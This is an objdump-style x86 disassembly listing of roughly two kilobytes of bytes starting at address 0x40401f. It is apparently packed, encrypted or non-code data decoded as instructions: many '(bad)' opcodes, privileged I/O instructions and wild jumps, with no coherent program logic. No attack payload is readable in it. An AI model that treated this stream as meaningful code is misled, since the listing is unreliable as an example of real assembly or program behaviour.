  40401f:	xchg   esi,eax
  404020:	sub    bh,BYTE PTR [edi+0x5e6f8f47]
  404026:	pop    DWORD PTR [edi+0x24]
  404029:	pop    ecx
  40402a:	adc    DWORD PTR [edx+0x40],0x4ee87837
  404031:	pop    ds
  404032:	mov    al,ds:0x52824192
  404037:	jno    0x404086
  404039:	mov    edi,0x7780f0ec
  40403e:	cmp    edi,DWORD PTR [ebx+0x19a233b0]
  404044:	jbe    0x404024
  404046:	xor    al,0xaf
  404048:	pop    ss
  404049:	into   
  40404a:	add    ah,BYTE PTR [ecx+eax*4+0x2fc6ba9c]
  404051:	mov    ds:0xc9b5a2ea,al
  404056:	ins    BYTE PTR es:[edi],dx
  404057:	aaa    
  404058:	xchg   ecx,eax
  404059:	nop
  40405a:	pop    ds
  40405b:	push   es
  40405c:	jle    0x40402b
  40405e:	sbb    al,0xf6
  404060:	push   edi
  404061:	sub    esi,ecx
  404063:	mov    edx,0x29b17516
  404068:	adc    bl,BYTE PTR [ebp+0x27895e85]
  40406e:	push   edx
  40406f:	xlat   BYTE PTR ds:[ebx]
  404070:	ror    DWORD PTR [edi*1-0x237dcc56],0x6
  404078:	js     0x404043
  40407a:	je     0x4040a4
  40407c:	jae    0x40408b
  40407e:	xor    al,BYTE PTR [edi+0x7683069b]
  404084:	das    
  404085:	inc    ebp
  404086:	or     dl,dl
  404088:	mov    ecx,0x709a798f
  40408d:	lea    edx,[ecx+0x2a6fb714]
  404093:	fs xchg esp,eax
  404095:	loopne 0x40405a
  404097:	sahf   
  404098:	rol    ch,0xc1
  40409b:	fcomp  QWORD PTR [ecx]
  40409d:	jmp    0x40408e
  40409f:	(bad)
  4040a2:	cmc    
  4040a3:	inc    eax
  4040a4:	ins    BYTE PTR es:[edi],dx
  4040a5:	sub    eax,0x194a7cf6
  4040aa:	dec    esi
  4040ab:	jmp    0x344d6277
  4040b0:	pop    ebx
  4040b1:	inc    esp
  4040b2:	mov    dh,BYTE PTR [ebx-0x3f]
  4040b5:	mov    edi,0x6468ff70
  4040ba:	adc    edi,0xfffffff6
  4040bd:	or     BYTE PTR [edi+0x65],al
  4040c0:	pop    edx
  4040c1:	loopne 0x4040dc
  4040c3:	in     eax,0x38
  4040c5:	sub    DWORD PTR [ebx-0x3],esi
  4040c8:	or     BYTE PTR [ecx-0x48],ch
  4040cb:	adc    eax,0x959e20a7
  4040d0:	hlt    
  4040d1:	cwde   
  4040d2:	pop    ebx
  4040d3:	ins    BYTE PTR es:[edi],dx
  4040d4:	test   al,al
  4040d6:	xor    edi,eax
  4040d8:	in     al,0x6a
  4040da:	mov    cs,WORD PTR [eax+0x2c]
  4040dd:	add    dl,BYTE PTR [ecx-0x7c]
  4040e0:	pusha  
  4040e1:	es cmp eax,0xdadc7d30
  4040e7:	sub    eax,0xefc30898
  4040ec:	mov    WORD PTR ds:0xff39a31,ss
  4040f2:	ss (bad) 
  4040f4:	adc    cl,BYTE PTR [ebp+0x32d5b459]
  4040fa:	pop    edi
  4040fb:	mov    ebx,0x5d2f7c2e
  404100:	xor    BYTE PTR [edx],bl
  404102:	xchg   ecx,eax
  404103:	sub    eax,0xd1115be7
  404108:	jnp    0x4040dd
  40410a:	mov    al,0x12
  40410c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40410d:	inc    edx
  40410e:	mov    ebx,0xa6a7ed6d
  404113:	fdiv   QWORD PTR [esi-0x53]
  404116:	das    
  404117:	adc    BYTE PTR [ebx],bl
  404119:	ins    DWORD PTR es:[edi],dx
  40411a:	inc    esp
  40411b:	(bad)  
  40411c:	xor    ecx,DWORD PTR [ecx-0x6e77fd1]
  404122:	test   eax,0x540aa5d6
  404127:	push   ebx
  404128:	mov    esp,0x98549ad6
  40412d:	icebp  
  40412e:	jg     0x4041a9
  404130:	lea    ecx,[edi+0x4]
  404133:	or     DWORD PTR [esi],edx
  404135:	in     al,dx
  404136:	and    BYTE PTR [ebx+0x43dc0203],cl
  40413c:	push   eax
  40413d:	lods   al,BYTE PTR ds:[esi]
  40413e:	icebp  
  40413f:	jp     0x40416e
  404141:	sbb    esp,ebx
  404143:	sbb    al,0x76
  404145:	pushf  
  404146:	dec    ebp
  404147:	pop    esi
  404148:	xor    BYTE PTR [ebx+eax*8-0x7f],0x33
  40414d:	repz test eax,0xb4207011
  404153:	push   esp
  404154:	jb     0x404182
  404156:	sbb    BYTE PTR [ecx+0x38637e02],dl
  40415c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40415d:	mov    ch,0x20
  40415f:	push   edi
  404160:	push   cs
  404161:	gs pop ecx
  404163:	sbb    al,0xb1
  404165:	sub    eax,0xb1f8e59b
  40416a:	mov    eax,0x48577492
  40416f:	das    
  404170:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404171:	sbb    BYTE PTR [eax+0x4e],dl
  404174:	aam    0xf2
  404176:	and    esi,edx
  404178:	adc    BYTE PTR [ebx+0x7a1ca3c3],ah
  40417e:	or     ebp,DWORD PTR [ecx-0x25]
  404181:	leave  
  404182:	into   
  404183:	xor    edx,ebx
  404185:	sbb    edx,DWORD PTR [ecx+ebx*1]
  404188:	pushf  
  404189:	lahf   
  40418a:	cdq    
  40418b:	inc    BYTE PTR [ecx+0x9d81c83]
  404191:	cmp    ebp,edx
  404193:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404194:	xor    ecx,DWORD PTR [eax+0x7f]
  404197:	mov    ebp,esi
  404199:	retf   
  40419a:	xchg   BYTE PTR [esi-0x626444c0],bl
  4041a0:	repz dec edx
  4041a2:	fist   DWORD PTR [esi]
  4041a4:	and    DWORD PTR [ebx-0x46],esi
  4041a7:	cmp    eax,DWORD PTR [eax]
  4041a9:	xchg   DWORD PTR [esi+0x2e5e9f99],edi
  4041af:	in     al,dx
  4041b0:	mov    BYTE PTR [ebp-0x25],cl
  4041b3:	pop    esi
  4041b4:	cwde   
  4041b5:	mov    ebx,0x2c4f45d0
  4041ba:	bound  esi,QWORD PTR [eax]
  4041bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4041bd:	pop    ebp
  4041be:	loope  0x4041de
  4041c0:	repz and BYTE PTR [ebx+0x2b8f6923],bl
  4041c7:	test   al,0x39
  4041c9:	outs   dx,BYTE PTR ds:[esi]
  4041ca:	xchg   ebx,eax
  4041cb:	cwde   
  4041cc:	mov    ss,WORD PTR [esi-0x34]
  4041cf:	fs mov al,0x55
  4041d2:	repz (bad) 
  4041d5:	lea    ebx,[ecx-0x1d]
  4041d8:	jle    0x4041b8
  4041da:	adc    edx,DWORD PTR [ecx+eax*1+0x70]
  4041de:	lahf   
  4041df:	test   DWORD PTR [edx-0x54],esp
  4041e2:	sub    DWORD PTR ds:0x6afa582b,esi
  4041e8:	sbb    BYTE PTR ds:0xb53dac25,bh
  4041ee:	mov    bh,0xe1
  4041f0:	xchg   bl,dh
  4041f2:	outs   dx,BYTE PTR gs:[esi]
  4041f4:	lahf   
  4041f5:	(bad)  
  4041f6:	outs   dx,BYTE PTR ds:[esi]
  4041f7:	call   0xdb37889
  4041fc:	mov    edi,0x4da1e78e
  404201:	add    al,0x36
  404203:	pop    es
  404204:	cli    
  404205:	and    eax,0x606f7904
  40420a:	pop    es
  40420b:	push   ss
  40420c:	inc    ecx
  40420d:	push   ds
  40420e:	arpl   WORD PTR [ebp+0x46a02125],ax
  404214:	jmp    0x40424c
  404216:	pop    edi
  404217:	enter  0x5d49,0x4d
  40421b:	int3   
  40421c:	or     ah,BYTE PTR [eax]
  40421e:	lea    ebp,[edi]
  404220:	dec    ebx
  404221:	mov    ds:0xe1c808bf,al
  404226:	cmc    
  404227:	in     al,0x50
  404229:	aaa    
  40422a:	loop   0x404239
  40422c:	xchg   BYTE PTR [edx-0x7b],dl
  40422f:	or     al,0x5
  404231:	mov    WORD PTR ds:0x36b74b58,fs
  404237:	int    0xb3
  404239:	out    dx,eax
  40423a:	pop    ss
  40423b:	test   DWORD PTR fs:[ecx+0x24],0x90f9847
  404243:	inc    DWORD PTR [edi+0x4900f2b9]
  404249:	push   0x60
  40424b:	sub    cl,BYTE PTR [ebp+edi*8+0x15c57d60]
  404252:	pop    edi
  404253:	daa    
  404254:	fldcw  WORD PTR [edi-0xa]
  404257:	clc    
  404258:	repz imul dl
  40425b:	fsubr  DWORD PTR [edi+0x58]
  40425e:	xor    eax,0xa5e8bed1
  404263:	mov    ds:0xa5e3e2c7,al
  404268:	mov    ds:0x952dbdd1,eax
  40426d:	pop    ecx
  40426e:	outs   dx,BYTE PTR ds:[esi]
  40426f:	das    
  404270:	jnp    0x40421b
  404272:	out    0x80,eax
  404274:	dec    ecx
  404275:	sbb    DWORD PTR [ebp+0x20],ebx
  404278:	mov    ah,0xf2
  40427a:	mov    ?,edi
  40427c:	addr16 aaa 
  40427e:	pop    es
  40427f:	inc    ebp
  404280:	push   ebx
  404281:	inc    edi
  404282:	mov    cl,0x42
  404284:	loop   0x4042e3
  404286:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404287:	mov    ebp,0x6fdcec68
  40428c:	cmc    
  40428d:	push   edi
  40428e:	es pop ss
  404290:	fisub  DWORD PTR gs:[edi+0x6f133fd7]
  404297:	cmc    
  404298:	iret   
  404299:	inc    edx
  40429a:	push   eax
  40429b:	inc    ecx
  40429c:	ret    
  40429d:	add    BYTE PTR [ecx+0x1f740f48],0x0
  4042a4:	xor    eax,0x907fd64d
  4042a9:	lahf   
  4042aa:	and    dh,BYTE PTR [ebx]
  4042ac:	dec    esi
  4042ad:	and    dl,dl
  4042af:	jae    0x404247
  4042b1:	je     0x40428e
  4042b3:	loope  0x404319
  4042b5:	sar    BYTE PTR [ebx],1
  4042b7:	xor    DWORD PTR [bp+si-0x32b2],ebx
  4042bc:	and    eax,0xe6ff1102
  4042c1:	mov    esi,0xcef29c80
  4042c6:	push   es
  4042c7:	(bad)  
  4042c8:	shl    DWORD PTR [ebp-0x61],1
  4042cb:	div    BYTE PTR [edi-0x75]
  4042ce:	or     DWORD PTR [esi-0x394b2a68],eax
  4042d4:	(bad)  [eax-0xf0d7b3f]
  4042da:	out    dx,eax
  4042db:	mov    bl,0x69
  4042dd:	call   0x41c96788
  4042e2:	xchg   DWORD PTR [eax+eax*4+0x20],eax
  4042e6:	dec    ebp
  4042e7:	lahf   
  4042e8:	pushf  
  4042e9:	xchg   edi,eax
  4042ea:	sbb    eax,0x396cbd54
  4042ef:	dec    edx
  4042f0:	pop    esi
  4042f1:	je     0x4042d5
  4042f3:	out    0x2f,eax
  4042f5:	mov    edi,0x35f8ca8c
  4042fa:	gs into 
  4042fc:	loop   0x4042ba
  4042fe:	leave  
  4042ff:	mov    eax,ds:0x8a9dc6df
  404304:	or     eax,0xff6cbce
  404309:	int    0x30
  40430b:	mov    edi,DWORD PTR [esp+ebx*2+0x32eb1773]
  404312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404313:	clc    
  404314:	aaa    
  404315:	adc    al,0x78
  404317:	sub    al,BYTE PTR [esi+0x6e8b1713]
  40431d:	retf   
  40431e:	pop    edi
  40431f:	push   0xffffffba
  404321:	dec    ebp
  404322:	xlat   BYTE PTR ds:[ebx]
  404323:	dec    esp
  404324:	mov    bl,0x61
  404326:	test   eax,0xf5707120
  40432b:	push   es
  40432c:	out    dx,eax
  40432d:	fiadd  WORD PTR [edi-0x53]
  404330:	inc    eax
  404331:	test   al,0x8d
  404333:	xchg   ax,ax
  404335:	cmp    DWORD PTR [ebx+0x41],esp
  404338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404339:	iret   
  40433a:	(bad)  [eax]
  40433c:	sbb    al,BYTE PTR [ebp+0x22]
  40433f:	sbb    ch,BYTE PTR [edi-0x6]
  404342:	(bad)  
  404343:	ficom  DWORD PTR [ebp+0xa6ef0c3]
  404349:	sub    eax,esp
  40434b:	jns    0x404343
  40434d:	push   edi
  40434e:	test   BYTE PTR [eax-0x3d],ah
  404351:	sub    al,0xab
  404353:	jne    0x4042ff
  404355:	rcr    BYTE PTR [edx-0x7e1cc2be],0x66
  40435c:	mov    bl,0x3f
  40435e:	out    dx,eax
  40435f:	cwde   
  404360:	sbb    BYTE PTR fs:[ecx-0x1b],dh
  404364:	pop    ebp
  404365:	das    
  404366:	mov    ebx,0x39d59630
  40436b:	adc    ecx,DWORD PTR [ecx+0x73]
  40436e:	push   esp
  40436f:	fwait
  404370:	jmp    0x4dd71c24
  404375:	je     0x4043f0
  404377:	les    edx,FWORD PTR [edx+0x35]
  40437a:	sbb    ch,BYTE PTR [esi-0x7d]
  40437d:	xchg   ebp,eax
  40437e:	cdq    
  40437f:	in     al,0x8a
  404381:	popf   
  404382:	push   ebp
  404383:	jbe    0x404334
  404385:	dec    esi
  404386:	mov    al,0x32
  404388:	mov    ebp,0xadb1488c
  40438d:	sbb    ebp,DWORD PTR [edi+0x60]
  404390:	add    BYTE PTR ds:0x6be24937,0xc6
  404397:	icebp  
  404398:	jp     0x4043c1
  40439a:	test   edi,eax
  40439c:	fst    QWORD PTR [ecx-0x7b]
  40439f:	retf   0x4d12
  4043a2:	jno    0x4043f2
  4043a4:	ins    BYTE PTR es:[edi],dx
  4043a5:	and    esi,DWORD PTR [ecx+0x7abe3d42]
  4043ab:	jg     0x40432f
  4043ad:	mov    WORD PTR [edx],?
  4043af:	sbb    BYTE PTR [eax-0x68],ah
  4043b2:	fcomp  DWORD PTR [ebx+0x581c6cb2]
  4043b8:	(bad)  
  4043b9:	fdivr  st(1),st
  4043bb:	pushf  
  4043bc:	mov    esp,DWORD PTR [esi+edi*4]
  4043bf:	loope  0x40440e
  4043c1:	mov    BYTE PTR [ebx+0x18],al
  4043c4:	mov    ebp,0xf94e5809
  4043c9:	in     eax,0x68
  4043cb:	dec    edx
  4043cc:	inc    ecx
  4043cd:	idiv   BYTE PTR [esi+0x55]
  4043d0:	out    0xef,eax
  4043d2:	clc    
  4043d3:	stos   DWORD PTR es:[edi],eax
  4043d4:	stc    
  4043d5:	popa   
  4043d6:	popf   
  4043d7:	push   ecx
  4043d8:	(bad)  
  4043d9:	push   eax
  4043da:	cld    
  4043db:	pop    ebp
  4043dc:	repz imul esp,DWORD PTR [eax+0x58e53d83],0xfffffff5
  4043e4:	loopne 0x40437b
  4043e6:	adc    DWORD PTR [ecx+0x19b83207],ebx
  4043ec:	ret    
  4043ed:	aaa    
  4043ee:	or     al,0xfe
  4043f0:	test   BYTE PTR [esi],dl
  4043f2:	mov    ds:0x29108009,eax
  4043f7:	or     esp,DWORD PTR [eax+0x4b]
  4043fa:	test   DWORD PTR [edi+0x14],0x7e2c0780
  404401:	inc    esi
  404402:	(bad)  
  404403:	mov    bl,0xc8
  404405:	push   ecx
  404406:	retf   
  404407:	repnz into 
  404409:	aas    
  40440a:	push   ds
  40440b:	mov    fs,WORD PTR [ebp+0x58]
  40440e:	in     al,0x6f
  404410:	sub    DWORD PTR [eax+ebx*1],ecx
  404413:	ds push 0xc5578124
  404419:	sbb    eax,0x6a6cbe8b
  40441e:	inc    ecx
  40441f:	dec    esp
  404420:	mov    ebp,0xb15b007b
  404425:	inc    esi
  404426:	inc    ecx
  404427:	push   cs
  404428:	pop    ds
  404429:	cs shl dl,cl
  40442c:	nop
  40442d:	jecxz  0x404471
  40442f:	cld    
  404430:	push   es
  404431:	pop    esp
  404432:	bound  edi,QWORD PTR [edi-0x472e6a53]
  404438:	fnstsw WORD PTR [ebx+0x622d8bad]
  40443e:	sahf   
  40443f:	mov    BYTE PTR [esi+edx*1-0x75],dl
  404443:	mov    ecx,0xa07dd902
  404448:	dec    edi
  404449:	addr16 cmc 
  40444b:	pop    ds
  40444c:	enter  0x8cef,0x93
  404450:	iret   
  404451:	pop    edx
  404452:	inc    esi
  404453:	out    dx,eax
  404454:	mov    ds:0xec8300da,eax
  404459:	(bad)  
  40445a:	adc    DWORD PTR [ebp-0x30b453e0],esp
  404460:	jae    0x40444b
  404462:	xchg   edx,eax
  404463:	retf   
  404464:	sbb    al,BYTE PTR [ebx-0x70978639]
  40446a:	mov    dh,0xa1
  40446c:	mov    eax,ds:0x645e924b
  404471:	js     0x4044e6
  404473:	jmp    0x404478
  404475:	push   esp
  404476:	hlt    
  404477:	push   eax
  404478:	outs   dx,DWORD PTR ds:[esi]
  404479:	test   eax,0x92d5b89b
  40447e:	ret    
  40447f:	push   edx
  404480:	cmp    dl,BYTE PTR [edi-0x5bdd1d40]
  404486:	cmc    
  404487:	jno    0x40448a
  404489:	add    al,BYTE PTR [edi+0x2b]
  40448c:	out    0x97,eax
  40448e:	mov    ecx,0x2bf599f4
  404493:	add    ecx,esp
  404495:	jl     0x404445
  404497:	mov    dl,0x42
  404499:	mov    ah,0x24
  40449b:	add    edx,DWORD PTR [ebp-0x47]
  40449e:	dec    esp
  40449f:	mov    al,ds:0xadddff56
  4044a4:	mov    BYTE PTR [esi],dh
  4044a6:	adc    al,0xb4
  4044a8:	mov    BYTE PTR [ebp+0x2bef4b8c],ah
  4044ae:	push   ss
  4044af:	call   0x435295d4
  4044b4:	in     eax,0x4b
  4044b6:	push   ebx
  4044b7:	sbb    al,0x1a
  4044b9:	sti    
  4044ba:	icebp  
  4044bb:	pop    ss
  4044bc:	cmp    BYTE PTR [esi],0x91
  4044bf:	arpl   WORD PTR [ebp+0x9],si
  4044c2:	pminub mm6,QWORD PTR [ebp+0x5d]
  4044c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044c7:	(bad)  
  4044c8:	lds    ecx,FWORD PTR [edi+0x62ece28e]
  4044ce:	mov    ebx,0xc4f8e8e2
  4044d3:	retf   
  4044d4:	std    
  4044d5:	je     0x404461
  4044d7:	cwde   
  4044d8:	icebp  
  4044d9:	and    al,0xc5
  4044db:	jbe    0x40454e
  4044dd:	xor    DWORD PTR [ebp-0x50],0x1c
  4044e1:	inc    edi
  4044e2:	cmp    eax,0x12d3dd4f
  4044e7:	jbe    0x4044e2
  4044e9:	repz ds call 0xc710:0x7363cf37
  4044f2:	imul   eax,edi,0x88934240
  4044f8:	push   edi
  4044f9:	cwde   
  4044fa:	jmp    0x4044c4
  4044fc:	or     al,0x89
  4044fe:	pop    ecx
  4044ff:	je     0x404515
  404501:	push   eax
  404502:	inc    edx
  404503:	inc    esp
  404504:	and    esp,DWORD PTR [ecx-0x5b3ad936]
  40450a:	call   0xbba18176
  40450f:	jg     0x40456b
  404511:	pmullw mm6,mm7
  404514:	adc    ah,BYTE PTR [eax]
  404516:	cli    
  404517:	jns    0x404580
  404519:	ret    0xebb7
  40451c:	mov    edx,0xf4078f51
  404521:	or     bl,BYTE PTR [esp+edx*4-0x3f]
  404525:	sti    
  404526:	adc    dl,ch
  404528:	xor    al,0xe8
  40452a:	add    DWORD PTR [eax-0x13f22d66],edi
  404530:	(bad)  
  404531:	(bad)  
  404532:	jl     0x404583
  404534:	xor    eax,0x57e99932
  404539:	ja     0x40457f
  40453b:	mov    ebp,0x8db7a44b
  404540:	sub    BYTE PTR [ecx+0x6],bh
  404543:	test   BYTE PTR [esi-0x36],dl
  404546:	loopne 0x4044f8
  404548:	or     edx,edi
  40454a:	jbe    0x404575
  40454c:	mov    es,esi
  40454e:	test   DWORD PTR [edx],ecx
  404550:	in     al,0xac
  404552:	pop    esp
  404553:	add    DWORD PTR [edi],edi
  404555:	in     al,0x99
  404557:	in     eax,0xe5
  404559:	or     DWORD PTR [eax-0x2a79d],edi
  40455f:	and    BYTE PTR [eax-0x40],ch
  404562:	cmp    eax,0xde6d7abe
  404567:	(bad)  
  404568:	popf   
  404569:	sub    dh,bl
  40456b:	push   cs
  40456c:	dec    ebp
  40456d:	sub    al,0xc
  40456f:	clc    
  404570:	push   esp
  404571:	stos   DWORD PTR es:[edi],eax
  404572:	inc    ebp
  404573:	inc    edx
  404574:	leave  
  404575:	nop
  404576:	or     esp,DWORD PTR [ecx+ebp*8+0x7d]
  40457a:	xor    ebp,DWORD PTR [esi+ebp*2]
  40457d:	sbb    eax,0x54c304b3
  404582:	inc    esp
  404583:	loopne 0x404529
  404585:	pop    ebx
  404586:	push   ds
  404587:	jp     0x404545
  404589:	jno    0x404551
  40458b:	jg     0x40459c
  40458d:	pushf  
  40458e:	sbb    DWORD PTR [ebx-0x33],ebx
  404591:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404592:	rol    DWORD PTR [eax-0x65a65a96],cl
  404598:	(bad)  
  404599:	pusha  
  40459a:	sbb    bl,BYTE PTR [eax+0x7f]
  40459d:	jo     0x404610
  40459f:	dec    ebx
  4045a0:	sbb    DWORD PTR [edx],0x76581aa4
  4045a6:	das    
  4045a7:	add    al,0xe1
  4045a9:	ds jle 0x4045f8
  4045ac:	mov    ah,0x3c
  4045ae:	jns    0x4045d2
  4045b0:	imul   edi,DWORD PTR [edi],0xb1a487f1
  4045b6:	dec    esp
  4045b7:	cli    
  4045b8:	cmp    ebp,DWORD PTR [edi]
  4045ba:	pop    ebx
  4045bb:	pop    ds
  4045bc:	into   
  4045bd:	sbb    dl,BYTE PTR [ebx]
  4045bf:	mov    ebx,0x57c5d21b
  4045c4:	clc    
  4045c5:	imul   ecx,DWORD PTR [ecx+0x4a],0xffffff8c
  4045c9:	and    esi,DWORD PTR [ebx+0x60]
  4045cc:	dec    ebp
  4045cd:	retf   
  4045ce:	xor    DWORD PTR [edx-0x51c12c37],eax
  4045d4:	les    ebx,FWORD PTR [ebx-0x16]
  4045d7:	cld    
  4045d8:	hlt    
  4045d9:	popf   
  4045da:	xchg   edi,eax
  4045db:	mov    ebp,0xca2e2c56
  4045e0:	jge    0x404614
  4045e2:	daa    
  4045e3:	cdq    
  4045e4:	push   edx
  4045e5:	and    BYTE PTR [esi-0x12],ch
  4045e8:	out    0xeb,eax
  4045ea:	outs   dx,DWORD PTR ds:[esi]
  4045eb:	xchg   ebp,eax
  4045ec:	push   ebx
  4045ed:	repnz jecxz 0x404614
  4045f0:	jle    0x4045b4
  4045f2:	add    al,0x31
  4045f4:	sbb    al,BYTE PTR [ecx-0x118e2ce]
  4045fa:	pushf  
  4045fb:	shr    BYTE PTR [ecx],0x42
  4045fe:	fs pop edi
  404600:	sbb    edi,DWORD PTR [eax-0x5a28573b]
  404606:	retf   0x951c
  404609:	mov    dh,0x62
  40460b:	mov    ch,0xa
  40460d:	sbb    esp,ebx
  40460f:	or     ecx,DWORD PTR [eax+ebp*1+0x319742bf]
  404616:	dec    edx
  404617:	mov    ah,0xd8
  404619:	sub    BYTE PTR [ecx+0x3363c886],0x2d
  404620:	loopne 0x404640
  404622:	add    al,0x3f
  404624:	jle    0x404679
  404626:	dec    esp
  404627:	cld    
  404628:	test   al,0x1b
  40462a:	fistp  DWORD PTR [ebp-0x71]
  40462d:	and    dl,bl
  40462f:	test   ah,dh
  404631:	mov    edx,0xa37b48cb
  404636:	sub    ah,BYTE PTR [edi-0x49]
  404639:	jmp    0x7dc2:0x7504d868
  404640:	bound  esp,QWORD PTR [ecx-0x4]
  404643:	fisttp QWORD PTR [edi]
  404645:	addr16 je 0x404668
  404648:	loop   0x4045e9
  40464a:	out    0x76,eax
  40464c:	and    al,ch
  40464e:	(bad)  
  404650:	xchg   esi,eax
  404651:	jmp    0x969f65aa
  404656:	adc    BYTE PTR [edi+0x4b],bh
  404659:	lds    edx,FWORD PTR [esi+0x4113306b]
  40465f:	mov    eax,ds:0xe8cfd203
  404664:	inc    edx
  404665:	dec    ecx
  404666:	pushf  
  404667:	arpl   WORD PTR [edi+ebx*2-0x44],bp
  40466b:	repz ja 0x40468d
  40466e:	mov    ah,0xb9
  404670:	gs jmp 0x404684
  404673:	sub    cl,al
  404675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404676:	(bad)  
  404677:	jecxz  0x4046de
  404679:	jge    0x4046a5
  40467b:	push   0x73
  40467d:	pop    ss
  40467e:	dec    ebp
  40467f:	test   BYTE PTR [esi],al
  404681:	add    BYTE PTR [ebx+0xa9f152f],cl
  404687:	icebp  
  404688:	pusha  
  404689:	leave  
  40468a:	sbb    al,0xf4
  40468c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40468d:	push   ebp
  40468e:	mov    WORD PTR [edi-0x45e3ab2e],?
  404694:	xor    eax,0x9d232653
  404699:	jl     0x404644
  40469b:	ror    BYTE PTR [ecx+eiz*8-0x5f],cl
  40469f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046a0:	add    ebp,edi
  4046a2:	lock scas al,BYTE PTR es:[edi]
  4046a4:	jg     0x4046ab
  4046a6:	arpl   di,ax
  4046a8:	cld    
  4046a9:	retf   
  4046aa:	(bad)  
  4046ab:	push   0xffffffff
  4046ad:	jle    0x404654
  4046af:	jecxz  0x40468a
  4046b1:	sar    BYTE PTR [eax],cl
  4046b3:	shl    BYTE PTR [edx],0x43
  4046b6:	fld    QWORD PTR [ebp+edi*4-0x4db26256]
  4046bd:	js     0x4046d9
  4046bf:	mov    edi,esi
  4046c1:	push   0xffffffac
  4046c3:	sbb    eax,0xfce0dd9d
  4046c8:	fidivr WORD PTR [ebx-0x247ca780]
  4046ce:	scas   eax,DWORD PTR es:[edi]
  4046cf:	cmp    eax,0x5df170f2
  4046d4:	(bad)  
  4046d5:	xchg   ecx,eax
  4046d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d7:	iret   
  4046d8:	sti    
  4046d9:	inc    esp
  4046da:	daa    
  4046db:	jge    0x4046ab
  4046dd:	rol    BYTE PTR [ebx],1
  4046df:	rol    ecx,cl
  4046e1:	jmp    0xb479:0x5ba8faa6
  4046e8:	jae    0x404757
  4046ea:	pop    ebp
  4046eb:	jecxz  0x404672
  4046ed:	data16 and al,0xb9
  4046f0:	jns    0x404713
  4046f2:	jnp    0x404706
  4046f4:	stos   DWORD PTR es:[edi],eax
  4046f5:	mov    ch,0x50
  4046f7:	push   edi
  4046f8:	sbb    DWORD PTR [ebx-0x62],ebp
  4046fb:	pop    ds
  4046fc:	(bad)  
  4046fd:	pop    esi
  4046fe:	push   esi
  4046ff:	cwde   
  404700:	imul   ax,WORD PTR [edx+ebp*2-0x7],0x32
  404706:	mov    edi,0xf11d388d
  40470b:	js     0x40477d
  40470d:	cmp    edi,DWORD PTR [edx+0x15]
  404710:	or     BYTE PTR [edi+eax*8],cl
  404713:	pop    ds
  404714:	test   al,0xce
  404716:	int3   
  404717:	push   0x25804d4f
  40471c:	cmp    eax,0x7877651f
  404721:	xor    DWORD PTR [ebp+0x283758c4],esi
  404727:	(bad)  
  404728:	mov    eax,ds:0xa35cf3e6
  40472d:	fwait
  40472e:	dec    eax
  40472f:	and    DWORD PTR [esi-0x2f5f9436],edi
  404735:	fs je  0x404747
  404738:	mov    al,0x12
  40473a:	cld    
  40473b:	ins    DWORD PTR es:[edi],dx
  40473c:	out    0xfd,eax
  40473e:	cmp    al,0x7f
  404740:	push   0xfdde2ecd
  404745:	in     eax,dx
  404746:	jp     0x404734
  404748:	jge    0x404713
  40474a:	(bad)  
  40474b:	jmp    0x568d4c16
  404750:	out    dx,eax
  404751:	add    BYTE PTR [eax-0x7c55bfb5],dh
  404757:	jp     0x40471e
  404759:	or     ah,bh
  40475b:	sahf   
  40475c:	test   eax,0xf2c83a39
  404761:	loope  0x4047c8
  404763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404764:	rcr    ecx,0x4
  404767:	push   0xae696c52
  40476c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40476d:	mov    BYTE PTR [ecx],al
  40476f:	in     al,0x4c
  404771:	fistp  QWORD PTR [esi]
  404773:	xchg   ebp,eax
  404774:	ret    0xe444
  404777:	push   es
  404778:	or     BYTE PTR [ebx-0x3e5dab2d],ch
  40477e:	cmc    
  40477f:	mov    edx,0xbbcea4f3
  404784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404785:	ror    BYTE PTR [eax-0xe],0x94
  404789:	inc    edx
  40478a:	sub    bl,BYTE PTR [eax-0x4e]
  40478d:	jge    0x4047f9
  40478f:	in     eax,0xde
  404791:	nop
  404792:	jno    0x4047f3
  404794:	mov    edi,0x65de38a2
  404799:	mov    ds:0x13ceb530,al
  40479e:	inc    esp
  40479f:	lods   eax,DWORD PTR fs:[esi]
  4047a1:	mov    al,0xc8
  4047a3:	loop   0x4047b1
  4047a5:	sub    ch,BYTE PTR [ebp-0x61c1ce3]
  4047ab:	jnp    0x4047bf
  4047ad:	int3   
  4047ae:	xchg   ebx,eax
  4047af:	add    BYTE PTR [ebx+0x5b22205f],al
  4047b5:	fnstsw WORD PTR [edi]
  4047b7:	or     al,0x98
  4047b9:	push   eax
  4047ba:	retf   0x4902
  4047bd:	popf   
  4047be:	jne    0x404790
  4047c0:	jl     0x40481d
  4047c2:	mov    dh,0x63
  4047c4:	dec    eax
  4047c5:	inc    ecx
  4047c6:	mov    al,0x64
  4047c8:	fwait
  4047c9:	add    al,BYTE PTR [eax+0x23]
  4047cc:	fcmovu st,st(5)
  4047ce:	push   0x7b7cb9ed
  4047d3:	inc    esi
  4047d4:	cvtps2pi mm6,QWORD PTR [ebp-0x48]
  4047d8:	cmp    al,0xb0
  4047da:	add    eax,0xc3b43289
  4047df:	shl    DWORD PTR [eax],cl
  4047e1:	mov    ebp,0x93a2aeb1
  4047e6:	pop    ecx
  4047e7:	xchg   edi,eax
  4047e8:	cmp    DWORD PTR [eax],ecx
  4047ea:	outs   dx,BYTE PTR ds:[esi]
  4047eb:	xor    ebp,esi
  4047ed:	and    DWORD PTR [edx-0x67ece787],ebx
  4047f3:	pop    edi
  4047f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
